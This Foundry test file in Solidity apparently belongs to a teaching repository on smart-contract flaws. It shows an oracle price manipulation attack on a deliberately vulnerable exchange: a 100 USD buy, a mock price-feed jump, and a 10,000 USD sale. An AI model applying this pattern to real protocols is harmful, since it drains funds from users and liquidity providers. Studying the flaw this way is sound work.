// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/oracle-price-manipulation/VulnerableExchange.sol";
import "../src/oracle-price-manipulation/MockV3Aggregator.sol";

/// @title Oracle Price Test Contract
/// @author Ishan Lakhwani
/// @notice Test contract for testing oracle price manipulation vulnerabilities
/// @dev Tests price manipulation scenarios in VulnerableExchange contract
contract OraclePriceTest is Test {
    VulnerableExchange public exchange;
    MockV3Aggregator public priceFeed;

    function setUp() public {
        priceFeed = new MockV3Aggregator(8, 1 * 10 ** 8); // Initial price: $1 (8 decimals)
        exchange = new VulnerableExchange(
            address(priceFeed),
            10000, // 10,000 USD initial reserve
            1000 // 1,000 TOKEN initial reserve
        );
    }

    function testPriceManipulation() public {
        console.log("\n=== Oracle Price Manipulation Attack ===");
        console.log("Initial TOKEN price: %s USD", priceFeed.latestAnswer() / 1e8);

        console.log("\n[Step 1] Attacker buys at low price ($1):");
        uint256 tokensReceived = exchange.swapUSDForToken(100 * 10 ** 18);
        console.log("Attacker spends: 100 USD");
        console.log("Attacker receives: %s TOKEN", tokensReceived / 1e18);
        assertEq(tokensReceived, 100 * 10 ** 18);

        console.log("\n[Step 2] Attacker manipulates price:");
        priceFeed.updateAnswer(100 * 1e8);
        console.log("Manipulated TOKEN price to: %s USD", priceFeed.latestAnswer() / 1e8);

        console.log("\n[Step 3] Attacker sells at high price ($100):");
        uint256 usdReceived = exchange.swapTokenForUSD(tokensReceived);
        console.log("Attacker receives: %s USD", usdReceived / 1e18);
        assertEq(usdReceived, 10000 * 10 ** 18);

        console.log("\n[Step 4] Attack Result:");
        console.log("Initial investment: 100 USD");
        console.log("Final return: %s USD", usdReceived / 1e18);
        console.log("Profit: %s USD", (usdReceived - 100 * 10 ** 18) / 1e18);
    }
}
